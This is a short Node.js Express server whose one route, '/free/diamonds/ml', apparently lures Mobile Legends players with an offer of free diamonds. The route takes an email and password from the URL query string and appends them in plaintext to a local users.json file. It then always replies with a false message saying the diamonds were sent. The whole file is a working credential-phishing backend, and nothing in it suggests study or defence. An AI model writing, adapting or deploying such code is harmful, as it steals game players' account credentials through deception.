const fs = require('fs');
const path = require('path');
const express = require('express');
const app = express();

app.get('/free/diamonds/ml', async (req, res) => {
  const { email, password, diamonds } = req.query;
  if (!email || !password || !diamonds) {
    return res.json({ error: 'Email, password, and diamonds are required bobo' }); // Fixed the error message
  }

  const jsonPath = '/user/users.json';
  const filePath = path.join(__dirname, jsonPath);
  let data = JSON.parse(fs.readFileSync(filePath, "utf-8"));

  // Check if the email exists in data, if not, initialize it as an empty array
  if (!data[email]) {
    data[email] = [];
  }

  // Push the new object into the array
  data[email].push({
    password,
    diamonds
  });

  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 4));
    res.json({ success: `Successfully sent ${diamonds} diamonds to your account` });
  } catch (error) {
    res.json({ error: error.message });
  }
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
